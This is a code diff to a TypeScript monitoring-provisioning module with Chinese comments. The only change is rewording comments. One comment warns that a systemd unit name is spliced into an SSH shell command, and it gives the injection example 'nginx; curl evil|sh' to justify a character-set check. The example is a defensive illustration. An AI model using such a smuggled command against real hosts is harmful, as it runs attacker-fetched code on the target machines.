@@ -1,7 +1,7 @@
 import { t } from '../i18n.js'
 import { shortGroup, type ServiceRule } from '../metrics/services.js'
 
-// 「添加主机」时顺带建观测项：三类模板 → kuma-monitor add 的 payload。
+// 「添加主机」时顺带建观测项：三类模板 → 观测项 payload。
 // 命名沿用现有约定「<组短名> / <服务名>」，这样观测页的 shortName() 还能剥掉前缀；
 // chip 映射走 host-services.json 的 monitor:<id>（精确钉死），所以名字随便改也不影响跳转。
 export type HostIdentity = { id: string; label?: string }
@@ -65,8 +65,8 @@ export function planMonitors(input: ProvisionInput): PlannedMonitor[] {
     const unit = String(svc.unit ?? '').trim()
     const ssh = svc.ssh
     if (!unit) throw new Error(t('systemd 服务缺单元名'))
-    // unit 会拼进 ssh_command（'systemctl is-active ' + unit），Kuma 在目标机上按 shell 执行；
-    // 不卡字符集的话 'nginx; curl evil|sh' 会真的跑起来（坑 49）。
+    // unit 会拼进 ssh_command（'systemctl is-active ' + unit），在目标机上按 shell 执行；
+    // 不卡字符集的话 'nginx; curl evil|sh' 会真的跑起来。
     if (!UNIT_RE.test(unit)) throw new Error(t('单元名只能是字母、数字、点、下划线、@、冒号、短横线：{unit}', { unit }))
     if (!address) throw new Error(t('缺少主机地址，systemd 探测没法建'))
     if (!ssh || !String(ssh.user ?? '').trim()) throw new Error(t('systemd 探测需要 SSH 用户名'))
